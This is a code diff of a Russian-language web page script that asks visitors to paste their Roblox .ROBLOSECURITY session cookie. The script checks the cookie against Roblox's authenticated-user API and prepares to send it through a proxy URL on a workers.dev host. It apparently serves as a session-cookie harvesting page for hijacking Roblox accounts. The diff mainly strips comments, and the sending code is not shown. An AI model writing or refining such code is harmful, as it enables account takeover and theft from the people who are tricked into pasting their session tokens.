@@ -54,7 +54,6 @@
 (function(){
     const PROXY_URL = "https://robl.megadoner517.workers.dev";
     
-    // ТЕМА
     const themeBtn = document.getElementById('themeToggleBtn');
     function loadTheme(){
         const saved = localStorage.getItem('rbx_theme');
@@ -80,7 +79,6 @@
     if(themeBtn) themeBtn.addEventListener('click', toggleTheme);
     loadTheme();
 
-    // ЗВЁЗДЫ
     function createStars(){
         const container = document.getElementById('stars');
         for(let i=0;i<150;i++){
@@ -97,7 +95,6 @@
     }
     createStars();
 
-    // ПЕЧЕНЬКИ
     for(let i=0;i<40;i++){
         let cookie = document.createElement('div');
         cookie.classList.add('floating-cookie');
@@ -114,24 +111,18 @@
     const statusDiv = document.getElementById('status');
     const msgArea = document.getElementById('messageArea');
 
-    let isValidating = false;
-
-    // Функция проверки куки через Roblox API (валидность!)
     async function checkCookieValidity(cookieValue){
         try {
             const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
                 method: "GET",
-                headers: {
-                    "Cookie": `.ROBLOSECURITY=${cookieValue}`
-                }
+                headers: { "Cookie": `.ROBLOSECURITY=${cookieValue}` }
             });
-            return response.ok; // true если кука рабочая, false если нет
+            return response.ok;
         } catch(e) {
             return false;
         }
     }
 
-    // Базовая проверка (длина + WARNING)
     function isBasicValid(val){
         if(!val || val.trim() === '') return false;
         const t = val.trim();
@@ -165,7 +156,6 @@
             return;
         }
         
-        // Если формат правильный, проверяем валидность через Roblox
         statusDiv.innerHTML = '<span>🔄</span> Проверка куки... Подождите';
         statusDiv.style.color = '#fbbf24';
         sendBtn.disabled = true;
@@ -199,7 +189,6 @@
     });
     cookieInput.addEventListener('paste', () => setTimeout(() => updateUI(), 100));
     
-    // Первоначальное состояние
     updateUI();
 
     sendBtn.onclick = async () => {
